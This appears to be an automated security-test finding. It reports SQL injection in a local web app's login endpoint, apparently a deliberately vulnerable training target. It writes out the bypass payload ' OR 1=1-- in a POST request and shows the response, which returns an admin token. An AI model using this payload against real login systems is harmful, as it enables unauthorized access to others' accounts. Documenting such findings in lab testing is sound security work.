title: SQL Injection in Login - Authentication Bypass
description: The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. Using payload ' OR 1=1-- bypasses authentication and returns a valid JWT token for the admin user (admin@juice-sh.op). This allows full admin access to the application.
poc: Probe request against POST http://127.0.0.1:3010/rest/user/login; observed proving result from prior stage handoff: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
